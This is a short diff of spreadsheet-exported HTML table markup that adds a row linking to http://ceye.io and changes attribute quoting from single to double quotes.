-<td class='x71'></td>
+ <tr height="20" style="mso-height-source:userset;height:15.6pt" id="r138">
+<td height="20" class="x81" style="height:15.6pt;"><a href="http://ceye.io" target="_parent"><span style="font-size:12pt;color:#800080;font-weight:400;text-decoration: underline;text-line-through:none;text-underline-style:single;font-family:"等线";">http://ceye.io</span></a></td>
+<td class="x71"></td>
  </tr>
 <![if supportMisalignedColumns]>
- <tr height='0' style='display:none'>
-  <td width='281' style='width:210.75pt'></td>
-  <td width='1002' style='width:751.5pt'></td>
+ <tr height="0" style="display:none">
+  <td width="281" style="width:210.75pt"></td>
+  <td width="1002" style="width:751.5pt"></td>
  </tr>
  <![endif]>
 </table>
